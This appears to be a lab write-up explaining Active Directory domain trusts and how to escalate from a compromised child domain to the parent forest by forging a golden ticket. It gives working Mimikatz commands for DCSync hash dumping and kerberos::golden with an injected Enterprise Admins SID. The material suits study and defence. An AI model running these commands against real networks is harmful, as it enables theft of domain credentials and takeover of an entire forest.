Domain Trusts are a mechanism for users in the network to gain access to other resources in the domain. For the most part, trusts outline how the domains inside of a forest communicate with each other.<br>
There are two main types of trusts that can be configured between domains:

    Directional - The direction of the trust flows from a trusting domain to a trusted domain (one-Way Trust,Two-Way Trust).
    Transitive - If Domain A trusts Domain B and Domain B trusts Domain C, then Domain A will also trust Domain C, creating a chain of trust.
The trust between a parent and child domain is bidirectional. This is intended behaviour and is used to share resources through greater transitive trust relationships. However, as an attacker, we can also exploit this trust to compromise the parent domain if we have compromised a child domain.<br> 

**KRBTGT account**

KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used to encrypt and sign all Kerberos tickets for the domain. Since the password hash is shared by all domain controllers, they can then verify the authenticity of the received TGT when users request access to resources.<br>

**Golden Ticket attack**

In order to forge TGTs, we need the following information:

    The FQDN of the domain
    The Security Identifier (SID) of the domain
    The username of the account we want to impersonate
    The KRBTGT password hash

we need to dump all NTML hashes including the krbtgt account using ```mimkatz```:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync
```

**Inter-Realm TGTs**


If the client requested a TGS to a certain service with his authenticated TGT and this service within another domain (there is a bid trust between them), the Domain controller belongs to his domain will issue a special TGT called an Inter-Realm or Referral Ticket. This ticket is encrypted with the **trust key** between the two domains and contains the user's principal name, the realm name of the domain where the service resides, and the requested service.
 In our case, we want to exploit the bidirectional trust relationship between the child and parent domain to gain full access to the parent domain.<br>
We will include extra account SIDs of administrative group to grant Administrative privileges over the entire forest!.<br>

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of this administrative group as an extra SID to our forged ticket for the domain controller of the child domain.<br>

Before we can go into exploitation, we first need to recover two SIDs:

    The SID of the child domain controller, which we will impersonate in our forged TGT
    The SID of the Enterprise admin group in the parent domain, which we will add as an extra SID to our forged TGT

To recover the SID of the child domain controller:
```
Get-ADComputer -Identity "<TheChildDomainController>"
```
To recover the SID of the Enterprise admin group:
```
Get-ADGroup -Identity "the Enterprise admin group" -Server <ParentDOmain>
```
**Exploiting Domain Trusts**

We finally have all of the information required to create our forged TGT. We will use Mimikatz to generate this golden ticket. The command will look something like this:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:<DOmainName> /sid:<OfTheChildDomainController> /service:krbtgt /rc4:<hash of krbtgt> /sids:<SID of Enterprise admin group> /ptt
```

First, we will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator user of the child domain:
```
C:\>dir \\ChildDomain.local\c$
```

This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:
```
C:\>dir \\ParentDomain\c$\
```


